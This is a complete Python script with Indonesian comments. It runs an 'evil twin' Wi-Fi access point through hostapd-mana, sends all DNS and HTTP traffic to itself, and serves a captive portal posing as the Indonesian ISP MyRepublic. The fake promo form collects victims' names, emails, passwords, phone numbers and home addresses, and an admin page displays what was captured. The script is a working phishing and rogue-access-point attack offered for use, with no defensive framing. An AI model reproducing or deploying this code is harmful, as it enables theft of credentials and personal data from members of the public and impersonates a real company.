#!/usr/bin/env python3
import os
import subprocess
import signal
import time
import sys
import datetime
import threading
from fastapi import FastAPI, Request, Form
from fastapi.responses import HTMLResponse, RedirectResponse, Response
import uvicorn

# === Config ===
AP_IFACE = "wlan0"
INTERNET_IFACE = "eth0"
AP_IP = "192.168.1.1"
IP_RANGE = "192.168.1.2,192.168.1.100"
SUBNET = "255.255.255.0"
DNS_CONF = "/tmp/dnsmasq.conf"
HOSTAPD_CONF = "evil.conf"  # menggunakan evil.conf yang sudah dimodifikasi
CAPTIVE_PORTAL_HTTP_PORT = 80

PORTAL_HOST = "0.0.0.0"
PORTAL_PORT = CAPTIVE_PORTAL_HTTP_PORT

# state
allowed_clients = set()  # klien yang sudah "disetujui" lewat /continue
form_submissions = []  # data form yang disubmit user

def run(cmd, silent=False):
    if silent:
        subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    else:
        print(f"[+] {cmd}")
        subprocess.run(cmd, shell=True)

def cleanup(signum=None, frame=None):
    print(f"[*] Cleaning up... {datetime.datetime.now().isoformat()}")
    if os.path.exists("/tmp/iptables.backup"):
        run("iptables-restore < /tmp/iptables.backup", silent=True)
    run("echo 0 > /proc/sys/net/ipv4/ip_forward", silent=True)
    run("killall -9 dnsmasq hostapd-mana 2>/dev/null", silent=True)
    run(f"ip addr flush dev {AP_IFACE}", silent=True)
    run(f"rm -f {DNS_CONF}", silent=True)
    run("systemctl restart NetworkManager wpa_supplicant 2>/dev/null", silent=True)
    print("[*] Cleanup complete.")
    sys.exit(0)

# hook signals
signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

# require root
if os.geteuid() != 0:
    print("This script must be run as root")
    sys.exit(1)

print(f"[*] Starting MyRepublic Evil Twin + Captive Portal at {datetime.datetime.now().isoformat()}")

# upstream connectivity check
print("[*] Checking internet access on", INTERNET_IFACE)
run(f"ping -I {INTERNET_IFACE} -c 1 8.8.8.8", silent=True)

# kill conflicts and stop network managers
run("killall -9 dnsmasq hostapd-mana", silent=True)
run("systemctl stop NetworkManager wpa_supplicant", silent=True)
time.sleep(2)

# Additional cleanup
run("rfkill unblock wifi", silent=True)
run("rfkill unblock all", silent=True)

# configure AP interface
print(f"[*] Configuring {AP_IFACE} interface...")
run("rfkill unblock wifi", silent=True)
run(f"ip link set {AP_IFACE} up", silent=True)
run(f"ip addr flush dev {AP_IFACE}", silent=True)
run(f"ip addr add {AP_IP}/24 dev {AP_IFACE}", silent=True)

# Debug: Check interface status
print(f"[*] Checking {AP_IFACE} status...")
run(f"ip addr show {AP_IFACE}")
run(f"iwconfig {AP_IFACE}")

# write dnsmasq config - redirect semua ke portal
with open(DNS_CONF, "w") as f:
    f.write(f"""interface={AP_IFACE}
bind-interfaces
dhcp-range={IP_RANGE},{SUBNET},12h
dhcp-option=option:router,{AP_IP}
dhcp-option=option:dns-server,{AP_IP}
dhcp-authoritative
log-queries
log-dhcp
# Redirect all domains to portal
address=/#/{AP_IP}
# OS captive detection overrides
address=/connectivitycheck.gstatic.com/{AP_IP}
address=/clients3.google.com/{AP_IP}
address=/msftconnecttest.com/{AP_IP}
address=/captive.apple.com/{AP_IP}
address=/www.apple.com/{AP_IP}
address=/detectportal.firefox.com/{AP_IP}
""")

# start dnsmasq
run(f"dnsmasq -C {DNS_CONF}")

# enable IP forwarding and snapshot iptables
run("echo 1 > /proc/sys/net/ipv4/ip_forward")
run("iptables-save > /tmp/iptables.backup")
run("iptables -F")
run("iptables -t nat -F")
run("iptables -P FORWARD ACCEPT")

# forwarding / NAT untuk client yang sudah approved
run(f"iptables -A FORWARD -i {AP_IFACE} -o {INTERNET_IFACE} -j ACCEPT")
run(f"iptables -A FORWARD -i {INTERNET_IFACE} -o {AP_IFACE} -m state --state RELATED,ESTABLISHED -j ACCEPT")
run(f"iptables -t nat -A POSTROUTING -s 192.168.1.0/24 -o {INTERNET_IFACE} -j MASQUERADE")

# redirect semua HTTP traffic ke captive portal
run(f"iptables -t nat -A PREROUTING -i {AP_IFACE} -p tcp --dport 80 -j DNAT --to-destination {AP_IP}:{CAPTIVE_PORTAL_HTTP_PORT}")

# launch hostapd-mana
print(f"[*] Starting hostapd-mana with config: {HOSTAPD_CONF}")
run(f"hostapd-mana {HOSTAPD_CONF} &")

# Wait a moment and check if hostapd is running
time.sleep(3)
print("[*] Checking hostapd-mana status...")
run("ps aux | grep hostapd")
run("iwconfig wlan0")

# === MyRepublic Captive Portal FastAPI App ===
app = FastAPI()
client_log = []

@app.middleware("http")
async def log_request(request: Request, call_next):
    client_ip = request.client.host
    ua = request.headers.get("user-agent", "<none>")
    path = request.url.path
    timestamp = datetime.datetime.now().isoformat()
    entry = {"time": timestamp, "client": client_ip, "path": path, "user_agent": ua}
    client_log.append(entry)
    print(f"[{timestamp}] {client_ip} {path} UA={ua}")

    # if already approved, just forward
    if client_ip in allowed_clients:
        return await call_next(request)
    return await call_next(request)

@app.get("/", response_class=HTMLResponse)
async def landing_page(request: Request):
    client_ip = request.client.host
    
    # if already approved, show success page
    if client_ip in allowed_clients:
        return HTMLResponse(content=f"""
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>MyRepublic - Akses Diberikan</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <style>
        body {{
            font-family: 'Poppins', sans-serif;
            background: linear-gradient(135deg, #662a81 0%, #992f8f 100%);
            color: white;
            padding: 2rem;
            text-align: center;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0;
        }}
        .container {{
            max-width: 600px;
            margin: 0 auto;
            background: rgba(255,255,255,0.15);
            padding: 2rem;
            border-radius: 15px;
            backdrop-filter: blur(10px);
            box-shadow: 0 15px 35px rgba(0,0,0,0.3);
        }}
        .success {{
            color: #4CAF50;
            font-size: 1.5rem;
            margin-bottom: 1rem;
        }}
        .logo {{
            font-weight: bold;
            font-size: 2.5rem;
            color: #fff;
            margin-bottom: 1rem;
        }}
        .btn {{
            display: inline-block;
            padding: 12px 24px;
            background: rgba(255,255,255,0.2);
            color: white;
            text-decoration: none;
            border-radius: 8px;
            margin: 10px;
            transition: all 0.3s ease;
        }}
        .btn:hover {{
            background: rgba(255,255,255,0.3);
            transform: translateY(-2px);
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">MyRepublic</div>
        <div class="success">✅ Akses Internet Diberikan!</div>
        <h2>Selamat Datang {client_ip}</h2>
        <p>Terima kasih telah mendaftar promo MyRepublic!</p>
        <p>Anda sudah terhubung dan bisa browsing dengan kecepatan tinggi.</p>
        <p><small>Tim kami akan menghubungi Anda segera untuk proses selanjutnya.</small></p>
        
        <a href="https://www.google.com" class="btn" target="_blank">
            <i class="fas fa-globe"></i> Mulai Browsing
        </a>
        <a href="https://myrepublic.co.id" class="btn" target="_blank">
            <i class="fas fa-home"></i> Website MyRepublic
        </a>
    </div>
</body>
</html>
        """, status_code=200)
    
    # show MyRepublic promo landing page
    html_template = """
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>MyRepublic Broadband Promo - Internet Cepat & Stabil</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }}
        body {{
            font-family: 'Poppins', sans-serif;
            background: linear-gradient(135deg, #662a81 0%, #992f8f 100%);
            color: white;
            line-height: 1.6;
        }}
        .header {{
            background: linear-gradient(135deg, #662a81 0%, #992f8f 100%);
            color: white;
            padding: 15px 0;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }}
        .container {{
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 20px;
        }}
        .header-content {{
            display: flex;
            justify-content: space-between;
            align-items: center;
        }}
        .logo-section {{
            display: flex;
            align-items: center;
            gap: 15px;
        }}
        .logo-section img {{
            max-width: 250px;
            height: auto;
        }}
        .logo-section p {{
            margin: 0;
            font-size: 1em;
            opacity: 0.9;
            font-weight: 500;
        }}
        .promo-section {{
            background: white;
            padding: 60px 0;
            margin-bottom: 30px;
            border-radius: 15px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }}
        .promo-title {{
            text-align: center;
            color: #662a81;
            font-size: 2.5rem;
            margin-bottom: 20px;
            font-weight: 700;
        }}
        .promo-content {{
            text-align: center;
            color: #333;
            max-width: 800px;
            margin: 0 auto;
            padding: 0 20px;
        }}
        .promo-highlight {{
            background: linear-gradient(135deg, #ff6b6b, #ee5a24);
            color: white;
            padding: 20px;
            border-radius: 10px;
            margin: 30px 0;
            font-weight: 600;
        }}
        .promo-image {{
            text-align: center;
            margin: 30px 0;
        }}
        .promo-image img {{
            max-width: 100%;
            height: auto;
            border-radius: 10px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        }}
        .form-section {{
            background: white;
            padding: 60px 0;
            border-radius: 15px;
            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
        }}
        .form-title {{
            text-align: center;
            color: #662a81;
            font-size: 2rem;
            margin-bottom: 10px;
            font-weight: 600;
        }}
        .form-description {{
            text-align: center;
            color: #666;
            margin-bottom: 40px;
        }}
        .form-grid {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }}
        .form-group {{
            margin-bottom: 20px;
        }}
        .form-group.full-width {{
            grid-column: 1 / -1;
        }}
        .form-label {{
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: #333;
        }}
        .form-input, .form-select, .form-textarea {{
            width: 100%;
            padding: 15px;
            border: 2px solid #e1e5e9;
            border-radius: 10px;
            font-size: 16px;
            transition: border-color 0.3s ease;
            font-family: inherit;
        }}
        .form-input:focus, .form-select:focus, .form-textarea:focus {{
            outline: none;
            border-color: #662a81;
        }}
        .form-textarea {{
            resize: vertical;
            min-height: 100px;
        }}
        .button-group {{
            display: flex;
            gap: 20px;
            justify-content: center;
            flex-wrap: wrap;
        }}
        .btn {{
            padding: 15px 30px;
            border: none;
            border-radius: 10px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            text-decoration: none;
            display: inline-flex;
            align-items: center;
            gap: 10px;
            transition: all 0.3s ease;
        }}
        .btn-primary {{
            background: linear-gradient(135deg, #662a81 0%, #992f8f 100%);
            color: white;
        }}
        .btn-secondary {{
            background: linear-gradient(135deg, #28a745 0%, #20c997 100%);
            color: white;
        }}
        .btn:hover {{
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(0,0,0,0.2);
        }}
        .footer {{
            background: #333;
            color: white;
            padding: 40px 0;
            margin-top: 40px;
        }}
        .footer-content {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 30px;
        }}
        .footer-logo img {{
            max-width: 200px;
            height: auto;
        }}
        .footer-section h4 {{
            color: #662a81;
            margin-bottom: 15px;
        }}
        .contact-info {{
            display: flex;
            flex-direction: column;
            gap: 10px;
        }}
        .contact-item {{
            color: white;
            text-decoration: none;
            display: flex;
            align-items: center;
            gap: 10px;
            transition: color 0.3s ease;
        }}
        .contact-item:hover {{
            color: #662a81;
        }}
        .info {{
            text-align: center;
            color: #666;
            margin-top: 20px;
            font-size: 0.9rem;
        }}
    </style>
</head>
<body>
    <header class="header">
        <div class="container">
            <div class="header-content">
                <div class="logo-section">
                    <a href="index.html">
                        <img src="wp-content/uploads/2023/09/MyRepublic-NEW-LOGO-04.png" alt="MyRepublic Logo">
                    </a>
                    <p>Authorized Sales Partner</p>
                </div>
            </div>
        </div>
    </header>

    <div class="container">
        <!-- Promo Section -->
        <section class="promo-section">
            <h1 class="promo-title">Promo Berlangganan MyRepublic Agustus 2025</h1>
            <div class="promo-content">
                <p>Langganan MyRepublic sekarang dan dapatkan harga diskon selama 12 bulan. Internet 100% unlimited up to 100 Mbps harga mulai Rp 200 ribuan dan GRATIS pasang!</p>
                
                <div class="promo-highlight">
                    <p>*Periode promo sampai 31 Agustus 2025. Yuk langganan sekarang! Hubungi kami untuk informasi lebih lanjut.</p>
                </div>
                
                <p><em>* Promo berlaku di area tertentu</em></p>
            </div>
            
            <div class="promo-image">
                <img src="https://www.myrepublicpromo.com/wp-content/uploads/2025/07/Mobile-Banner-Promo-Bulan-Juli-Back-to-School-1024x1024.jpg" alt="MyRepublic Promo Banner">
            </div>
            
            <div class="promo-content">
                <h3 style="color: #662a81; margin-bottom: 20px;">Langganan sekarang juga</h3>
                <p>Klik gambar diatas untuk informasi lengkap seputar promo yang berlaku</p>
            </div>
        </section>

        <!-- Form Section -->
        <section class="form-section">
            <h2 class="form-title">Formulir Pemasangan Baru</h2>
            <p class="form-description">Isi form berikut ini untuk mendapatkan promo GRATIS pemasangan baru perangkat wifi MyRepublic</p>
            
            <form id="installationForm" method="post" action="/submit-promo">
                <div class="form-grid">
                    <div class="form-group">
                        <label for="name" class="form-label">Nama Lengkap *</label>
                        <input type="text" id="name" name="name" class="form-input" placeholder="Masukkan nama lengkap" required>
                    </div>
                    
                    <div class="form-group">
                        <label for="email" class="form-label">Email *</label>
                        <input type="email" id="email" name="email" class="form-input" placeholder="Masukkan email" required>
                    </div>
                    
                    <div class="form-group">
                        <label for="password" class="form-label">Password *</label>
                        <input type="password" id="password" name="password" class="form-input" placeholder="Masukkan password" required>
                    </div>
                    
                    <div class="form-group">
                        <label for="phone" class="form-label">Phone/WA *</label>
                        <input type="tel" id="phone" name="phone" class="form-input" placeholder="08123456789" required>
                    </div>
                    
                    <div class="form-group">
                        <label for="phone2" class="form-label">Phone/WA 2 (Opsional)</label>
                        <input type="tel" id="phone2" name="phone2" class="form-input" placeholder="08123456789">
                    </div>
                    
                    <div class="form-group">
                        <label for="package" class="form-label">Pilihan Paket *</label>
                        <select id="package" name="package" class="form-select" required>
                            <option value="">Pilih Paket</option>
                            <option value="100mbps">100 Mbps - Rp 299.000/bulan</option>
                            <option value="200mbps">200 Mbps - Rp 399.000/bulan</option>
                            <option value="500mbps">500 Mbps - Rp 599.000/bulan</option>
                            <option value="1gbps">1 Gbps - Rp 999.000/bulan</option>
                        </select>
                    </div>
                    
                    <div class="form-group">
                        <label for="bundling" class="form-label">Bundling *</label>
                        <select id="bundling" name="bundling" class="form-select" required>
                            <option value="">Pilih Bundling</option>
                            <option value="internet-only">Internet Only</option>
                            <option value="internet-tv">Internet + TV</option>
                            <option value="internet-phone">Internet + Phone</option>
                            <option value="internet-tv-phone">Internet + TV + Phone</option>
                        </select>
                    </div>
                    
                    <div class="form-group">
                        <label for="installDate" class="form-label">Tanggal Pemasangan *</label>
                        <input type="date" id="installDate" name="installDate" class="form-input" required>
                    </div>
                    
                    <div class="form-group">
                        <label for="installTime" class="form-label">Waktu Pemasangan *</label>
                        <input type="time" id="installTime" name="installTime" class="form-input" required>
                    </div>
                    
                    <div class="form-group full-width">
                        <label for="address" class="form-label">Alamat Pemasangan *</label>
                        <textarea id="address" name="address" class="form-textarea" placeholder="Masukkan alamat lengkap pemasangan" required></textarea>
                    </div>
                </div>
                
                <div class="button-group">
                    <button type="submit" class="btn btn-primary">
                        <i class="fas fa-file-alt"></i>
                        Kirim Formulir
                    </button>
                    <a href="login.html" class="btn btn-secondary">
                        <i class="fas fa-sign-in-alt"></i>
                        Login
                    </a>
                </div>
            </form>
        </section>
    </div>

    <!-- Footer -->
    <footer class="footer">
        <div class="container">
            <div class="footer-content">
                <div class="footer-logo">
                    <a href="index.html">
                        <img src="wp-content/uploads/2022/06/MyRepublic-NEW-LOGO-04.png" alt="MyRepublic Logo">
                    </a>
                </div>
                
                <div class="footer-sections">
                    <div class="footer-section">
                        <h4>HUBUNGI SALES ADMIN</h4>
                        <div class="contact-info">
                            <a href="https://wa.me/6281218000818?text=Halo,%20saya%20mau%20langganan%20MyRepublic" target="_blank" class="contact-item">
                                <i class="fab fa-whatsapp"></i>
                                0812 1800 0818
                            </a>
                            <a href="tel:6281218000818" class="contact-item">
                                <i class="fas fa-phone-alt"></i>
                                0812 1800 0818
                            </a>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </footer>

    <div class="info">
        📍 IP Address: <strong>{client_ip}</strong><br/>
        🕒 {timestamp}<br/>
        <small>*Syarat & ketentuan berlaku. Tim MyRepublic akan menghubungi Anda dalam 1x24 jam.</small>
    </div>

    <script>
    // Auto redirect jika dari captive detection
    var userAgent = navigator.userAgent.toLowerCase();
    if (userAgent.includes('captivenetworksupport') || 
        userAgent.includes('wispr') || 
        window.location.pathname.includes('generate')) {{
        // Jangan auto redirect untuk captive detection, biarkan user lihat promo
        console.log('Captive portal detected, showing promo page');
    }}

    // Form validation
    document.querySelector('form').addEventListener('submit', function(e) {{
        var name = document.getElementById('name').value.trim();
        var email = document.getElementById('email').value.trim();
        var phone = document.getElementById('phone').value.trim();
        
        if (!name || !email || !phone) {{
            e.preventDefault();
            alert('Mohon isi nama lengkap, email, dan nomor HP/WhatsApp!');
            return false;
        }}
        
        // Validasi nomor HP Indonesia
        if (!phone.match(/^(08|62|\\+62)[0-9]{{8,12}}$/)) {{
            e.preventDefault();
            alert('Format nomor HP tidak valid! Gunakan format: 08xxxxxxxxxx');
            return false;
        }}
    }});
    </script>
</body>
</html>
"""
    
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    html = html_template.format(client_ip=client_ip, timestamp=timestamp)
    return HTMLResponse(content=html, status_code=200)

@app.post("/submit-promo", response_class=HTMLResponse)
async def submit_promo_form(request: Request, name: str = Form(...), email: str = Form(...), password: str = Form(...), phone: str = Form(...), phone2: str = Form(""), package: str = Form(...), bundling: str = Form(...), installDate: str = Form(...), installTime: str = Form(...), address: str = Form(...)):
    client_ip = request.client.host
    timestamp = datetime.datetime.now().isoformat()
    
    # Simpan data form
    form_data = {
        "timestamp": timestamp,
        "client_ip": client_ip,
        "name": name,
        "email": email,
        "password": password,
        "phone": phone,
        "phone2": phone2 or "Tidak ada",
        "package": package,
        "bundling": bundling,
        "installDate": installDate,
        "installTime": installTime,
        "address": address
    }
    form_submissions.append(form_data)
    
    # Grant access
    allowed_clients.add(client_ip)
    
    # Log submission
    print(f"[FORM] {timestamp} - {client_ip} - {name} - {email} - {phone} - {package}")
    
    # Response page
    html = f"""
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>MyRepublic - Pendaftaran Berhasil</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <style>
        body {{
            font-family: 'Poppins', sans-serif;
            background: linear-gradient(135deg, #4CAF50 0%, #45a049 100%);
            color: white;
            padding: 1rem;
            text-align: center;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0;
        }}
        .container {{
            max-width: 600px;
            background: rgba(255,255,255,0.15);
            padding: 2.5rem;
            border-radius: 20px;
            backdrop-filter: blur(10px);
            box-shadow: 0 15px 35px rgba(0,0,0,0.3);
        }}
        .logo {{
            font-weight: bold;
            font-size: 2.5rem;
            color: #fff;
            margin-bottom: 1rem;
        }}
        .success-icon {{
            font-size: 4rem;
            margin-bottom: 1rem;
        }}
        h2 {{
            margin: 0 0 1rem 0;
            font-size: 2rem;
        }}
        .message {{
            font-size: 1.1rem;
            line-height: 1.6;
            margin-bottom: 2rem;
        }}
        .user-info {{
            background: rgba(255,255,255,0.1);
            padding: 1.5rem;
            border-radius: 15px;
            margin: 1.5rem 0;
            text-align: left;
        }}
        .btn {{
            display: inline-block;
            padding: 0.8rem 2rem;
            margin: 0.5rem;
            background: rgba(255,255,255,0.2);
            border: 2px solid rgba(255,255,255,0.3);
            border-radius: 50px;
            text-decoration: none;
            color: #fff;
            font-weight: 500;
            transition: all 0.3s ease;
        }}
        .btn:hover {{
            background: rgba(255,255,255,0.3);
            transform: translateY(-2px);
        }}
        .next-steps {{
            background: rgba(255,193,7,0.2);
            padding: 1.5rem;
            border-radius: 15px;
            margin: 1.5rem 0;
            color: #fff;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">MyRepublic</div>
        <div class="success-icon">🎉</div>
        <h2>Pendaftaran Berhasil!</h2>
        
        <div class="message">
            Terima kasih <strong>{name}</strong>!<br/>
            Data pendaftaran promo MyRepublic Anda telah berhasil diterima.
        </div>
        
        <div class="user-info">
            <h4>📋 Data Pendaftaran:</h4>
            <p><strong>Nama:</strong> {name}</p>
            <p><strong>Email:</strong> {email}</p>
            <p><strong>No. HP/WA:</strong> {phone}</p>
            <p><strong>Paket:</strong> {package}</p>
            <p><strong>Bundling:</strong> {bundling}</p>
            <p><strong>Tanggal Instalasi:</strong> {installDate} {installTime}</p>
            <p><strong>Waktu Daftar:</strong> {timestamp}</p>
        </div>
        
        <div class="next-steps">
            <h4>📞 Langkah Selanjutnya:</h4>
            <p>• Tim MyRepublic akan menghubungi Anda dalam 1x24 jam</p>
            <p>• Survey lokasi akan dijadwalkan</p>
            <p>• Instalasi gratis sesuai promo</p>
            <p>• Aktivasi layanan internet super cepat!</p>
        </div>
        
        <div class="message">
            Sebagai bonus, Anda sekarang sudah terhubung ke internet!<br/>
            Silakan mulai browsing dengan kecepatan tinggi.
        </div>
        
        <a class="btn" href="https://www.google.com" target="_blank">
            <i class="fas fa-globe"></i> Mulai Browsing
        </a>
        <a class="btn" href="https://myrepublic.co.id" target="_blank">
            <i class="fas fa-home"></i> Website MyRepublic
        </a>
    </div>

    <script>
        // Auto redirect setelah 8 detik
        setTimeout(function() {{
            window.location.href = "https://www.google.com";
        }}, 8000);
    </script>
</body>
</html>
"""
    return HTMLResponse(content=html, status_code=200)

@app.get("/connect", response_class=HTMLResponse)
async def connect_client(request: Request):
    client_ip = request.client.host
    allowed_clients.add(client_ip)
    
    html = f"""
<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>MyRepublic - Connected</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <style>
        body {{
            font-family: 'Poppins', sans-serif;
            background: linear-gradient(135deg, #4CAF50 0%, #45a049 100%);
            color: #fff;
            padding: 2rem;
            text-align: center;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
        }}
        .container {{
            max-width: 500px;
            background: rgba(255,255,255,0.15);
            padding: 2.5rem;
            border-radius: 20px;
            backdrop-filter: blur(10px);
            box-shadow: 0 15px 35px rgba(0,0,0,0.3);
        }}
        .logo {{
            font-weight: bold;
            font-size: 2.5rem;
            color: #fff;
            margin-bottom: 1rem;
        }}
        .success-icon {{
            font-size: 4rem;
            margin-bottom: 1rem;
        }}
        h2 {{
            margin: 0 0 1rem 0;
            font-size: 2rem;
        }}
        .message {{
            font-size: 1.1rem;
            line-height: 1.6;
            margin-bottom: 2rem;
        }}
        .btn {{
            display: inline-block;
            padding: 0.8rem 2rem;
            margin: 0.5rem;
            background: rgba(255,255,255,0.2);
            border: 2px solid rgba(255,255,255,0.3);
            border-radius: 50px;
            text-decoration: none;
            color: #fff;
            font-weight: 500;
            transition: all 0.3s ease;
        }}
        .btn:hover {{
            background: rgba(255,255,255,0.3);
            transform: translateY(-2px);
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">MyRepublic</div>
        <div class="success-icon">🎉</div>
        <h2>Berhasil Terhubung!</h2>
        <div class="message">
            Client <strong>{client_ip}</strong> sekarang sudah terhubung ke internet MyRepublic.<br/>
            Nikmati kecepatan super cepat!
        </div>
        <a class="btn" href="https://www.google.com" target="_blank">
            <i class="fas fa-globe"></i> Start Browsing
        </a>
        <a class="btn" href="/">
            <i class="fas fa-home"></i> Back to Promo
        </a>
    </div>

    <script>
        setTimeout(function() {{
            if (window.opener) {{
                window.close();
            }} else {{
                window.location.href = "https://www.google.com";
            }}
        }}, 5000);
    </script>
</body>
</html>
"""
    return HTMLResponse(content=html, status_code=200)

# captive portal detection probes - Android/Chrome
@app.get("/generate_204")
@app.get("/generate204")
async def android_probe():
    html = """
<html><head><meta charset="utf-8"/><title>Captive Portal Detected</title></head>
<body>
<script>window.location='/'</script>
<p>Redirecting to portal...</p>
</body></html>
"""
    return HTMLResponse(content=html, status_code=200)

# Apple/macOS captive detection
@app.get("/hotspot-detect.html")
async def apple_probe():
    html = """
<!DOCTYPE html>
<html><head><meta charset="utf-8"/><title>Wi-Fi Login</title></head>
<body>
<h3>Captive Portal Detected</h3>
<p>Redirecting to login page...</p>
<script>setTimeout(()=>{ window.location='/' }, 500);</script>
</body></html>
"""
    return HTMLResponse(content=html, status_code=200)

# Firefox captive detection
@app.get("/success.txt")
async def success_txt():
    return Response(content="success\n", media_type="text/plain", status_code=200)

# fallback routes
@app.get("/library/test")
async def library_test():
    return RedirectResponse(url="/", status_code=302)

@app.get("/kindle-wifi/wifiredirect.html")
async def kindle_probe():
    return RedirectResponse(url="/", status_code=302)

# admin logs
@app.get("/logs", response_class=HTMLResponse)
async def view_logs():
    # Access log rows
    access_rows = ""
    for e in client_log[-30:]:  # last 30 entries
        access_rows += "<tr><td>{time}</td><td>{client}</td><td>{path}</td><td style='max-width:250px;overflow:hidden;text-overflow:ellipsis;'>{ua}</td></tr>".format(
            time=e["time"], client=e["client"], path=e["path"], ua=e["user_agent"][:80]
        )
    
    # Form submission rows
    form_rows = ""
    for f in form_submissions:
        form_rows += "<tr><td>{time}</td><td>{client}</td><td><strong>{name}</strong></td><td>{email}</td><td>{phone}</td><td>{package}</td></tr>".format(
            time=f["timestamp"], client=f["client_ip"], name=f["name"], email=f["email"], phone=f["phone"], package=f["package"]
        )
    
    html = f"""
<!DOCTYPE html>
<html><head><meta charset="utf-8"/><title>MyRepublic Portal - Admin Logs</title>
<style>
body{{font-family:'Segoe UI',Tahoma,Geneva,Verdana,sans-serif;background:#111;color:#eee;padding:1rem;}}
table{{width:100%;border-collapse:collapse;margin-top:1rem;}}
th,td{{padding:8px;border:1px solid #444;text-align:left;font-size:0.9rem;}}
th{{background:#662a81;color:#fff;}}
.stats{{background:#1e1e1e;padding:1.5rem;border-radius:12px;margin-bottom:1.5rem;}}
.myrepublic-header{{color:#662a81;font-size:2rem;font-weight:bold;margin-bottom:1rem;}}
.section{{margin-bottom:2rem;}}
.form-stats{{background:#4CAF50;color:#fff;padding:1rem;border-radius:8px;margin:1rem 0;}}
.highlight{{background:#662a81;color:#fff;padding:0.2rem 0.5rem;border-radius:4px;}}
</style>
</head>
<body>
<div class="myrepublic-header">MyRepublic Portal - Admin Dashboard</div>

<div class="stats">
<h2>📊 Portal Statistics</h2>
<p><strong>Total HTTP Requests:</strong> {len(client_log)}</p>
<p><strong>Connected Clients:</strong> {len(allowed_clients)}</p>
<p><strong>Active IP Addresses:</strong> {', '.join(allowed_clients) if allowed_clients else 'None'}</p>
</div>

<div class="form-stats">
<h3>🎯 MyRepublic Form Submissions: <span class="highlight">{len(form_submissions)} registrations</span></h3>
{f"<p><strong>Latest:</strong> {form_submissions[-1]['name']} ({form_submissions[-1]['email']}) - {form_submissions[-1]['phone']}</p>" if form_submissions else "<p>No form submissions yet</p>"}
</div>

<div class="section">
<h2>📋 MyRepublic Registration Data</h2>
{f"""
<table>
<tr><th>Timestamp</th><th>Client IP</th><th>Nama</th><th>Email</th><th>Phone</th><th>Package</th></tr>
{form_rows}
</table>
""" if form_submissions else "<p><em>No form submissions yet. Waiting for users to register...</em></p>"}
</div>

<div class="section">
<h2>📊 HTTP Access Log (Last 30 entries)</h2>
<table>
<tr><th>Time</th><th>Client IP</th><th>Path</th><th>User-Agent</th></tr>
{access_rows}
</table>
</div>

<div style="margin-top:2rem;padding:1rem;background:#333;border-radius:8px;text-align:center;">
<p><small>🔄 Auto-refresh setiap 30 detik | 🕒 {datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")}</small></p>
</div>

<script>
// Auto refresh every 30 seconds
setTimeout(function(){{
  window.location.reload();
}}, 30000);
</script>
</body></html>
"""
    return HTMLResponse(content=html, status_code=200)

def start_portal():
    uvicorn.run(app, host=PORTAL_HOST, port=PORTAL_PORT, log_level="warning")

# start portal background thread
portal_thread = threading.Thread(target=start_portal, daemon=True)
portal_thread.start()

print(f"\n[*] MyRepublic Promo Captive Portal running on http://{AP_IP}:{CAPTIVE_PORTAL_HTTP_PORT}")
print("[*] Semua client akan melihat promo MyRepublic dengan form pendaftaran.")
print("[*] Client yang sudah submit form akan mendapat akses internet penuh.")
print(f"[*] Admin dashboard: http://{AP_IP}/logs")
print("[*] Form data akan tersimpan dan ditampilkan di logs.")
print("[*] Press Ctrl+C to stop.\n")

# main loop
try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    cleanup() 